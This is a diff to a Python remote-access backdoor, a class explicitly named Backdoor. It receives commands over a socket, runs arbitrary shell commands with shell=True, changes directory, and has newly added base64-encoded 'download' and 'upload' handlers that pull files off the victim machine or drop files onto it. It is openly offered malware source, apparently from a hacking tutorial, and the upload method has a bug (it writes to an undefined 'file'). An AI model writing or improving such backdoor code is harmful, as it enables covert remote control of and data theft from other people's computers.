@@ -4,6 +4,7 @@ import socket
 import subprocess
 import json
 import os
+import base64
 
 
 class Backdoor:
@@ -32,20 +33,41 @@ class Backdoor:
     def execute_system_command(self, command):
         return subprocess.check_output(command, shell=True)
 
+    def read_file(self, path):
+        with open(path, "rb") as r_file:
+            return base64.b64encode(r_file.read())
+
+    def write_file(self, path, content):
+        with open(path, "wb") as w_file:
+            file.write(base64.b64decode(content))
+            return "[+] Upload Successful"
+
     def run(self):
         # connection.send("[+] I'am in")
 
         while True:
             command = self.reliable_recv()
-            if command[0] == "exit":
-                self.connection.close()
-                exit()
 
-            elif command[0] == "cd" and len(command) > 1:
-                command_result = self.change_work_dir(command[1])
+            try:
+                if command[0] == "exit":
+                    self.connection.close()
+                    exit()
 
-            else:
-                command_result = self.execute_system_command(command)
+                elif command[0] == "cd" and len(command) > 1:
+                    command_result = self.change_work_dir(command[1])
+
+                elif command[0] == "download":
+                    command_result = self.read_file(command[1])
+
+                elif command[0] == "upload":
+                    command_result = self.write_file(command[1], command[2])
+
+                else:
+                    command_result = self.execute_system_command(command)
+
+            except Exception:
+                command_result = "[-] Error during Execution"
+
             self.reliable_send(command_result)
 
 
